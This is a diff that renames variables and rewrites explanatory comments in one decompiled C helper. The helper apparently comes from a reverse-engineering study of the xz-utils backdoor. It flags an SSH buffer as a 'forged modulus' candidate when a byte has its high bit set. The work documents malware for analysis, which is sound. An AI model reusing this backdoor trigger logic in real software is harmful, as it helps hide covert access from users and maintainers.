@@ -5,9 +5,9 @@
 
 
 /*
- * AutoDoc: Treats an sshbuf as a serialized big integer. When the payload is between 0x20 and 0x40 bytes it scans forward until it finds a
- * byte with the sign bit set; encountering such a byte before hitting the end marks the buffer as “negative” and therefore
- * suitable for modulus harvesting.
+ * AutoDoc: Treats an `sshbuf` as a serialized big integer. Only buffers between 0x20 and 0x40 bytes qualify; the helper scans until it
+ * finds a byte with the sign bit set and tags the buffer as a "negative" modulus candidate. Any buffer that never trips the MSB
+ * probe (or sits outside the size window) is rejected.
  */
 
 #include "xzre_types.h"
@@ -15,20 +15,22 @@
 BOOL sshbuf_bignum_is_negative(sshbuf *buf)
 
 {
-  BOOL is_negative;
-  size_t index;
+  BOOL has_negative_mark;
+  size_t payload_offset;
   
-  is_negative = FALSE;
+  has_negative_mark = FALSE;
+  // AutoDoc: Enforce the expected `[0x20, 0x40]` payload span—anything shorter/longer clearly is not the forged modulus.
   if (buf->size - 0x20 < 0x21) {
-    index = 0;
-    while (-1 < (char)buf->d[index]) {
-      index = index + 1;
-      if (buf->size == index) {
+    payload_offset = 0;
+    // AutoDoc: Walk forward until a byte with bit 7 set appears; if we hit the end first the buffer is not considered negative.
+    while (-1 < (char)buf->d[payload_offset]) {
+      payload_offset = payload_offset + 1;
+      if (buf->size == payload_offset) {
         return FALSE;
       }
     }
-    is_negative = TRUE;
+    has_negative_mark = TRUE;
   }
-  return is_negative;
+  return has_negative_mark;
 }
 
